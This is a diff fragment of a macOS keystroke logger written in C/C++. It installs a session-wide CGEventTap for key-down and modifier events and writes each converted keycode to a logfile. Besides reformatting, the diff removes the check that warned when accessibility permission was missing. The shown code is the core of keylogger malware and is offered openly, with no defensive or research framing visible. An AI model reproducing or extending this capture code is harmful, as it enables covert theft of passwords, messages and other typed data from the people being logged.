@@ -4,12 +4,9 @@ int main(int argc, const char *argv[]) {
 
     CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
-    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, &flags);
-
-    if(!eventTap) {
-        cout << "You need to enable \"Enable access for assistive devices\" in the System Preferences Accessibility panel." << endl;
-        exit(1);
-    }
+    CFMachPortRef eventTap = CGEventTapCreate(
+        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, &flags
+    );
 
     CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
@@ -28,11 +25,9 @@ int main(int argc, const char *argv[]) {
 }
 
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) { 
-        return event;
-    }
+    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) { return event; }
+    
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-
     fprintf(logfile, "%s", convertKeyCode(keyCode));
     fflush(logfile);
 
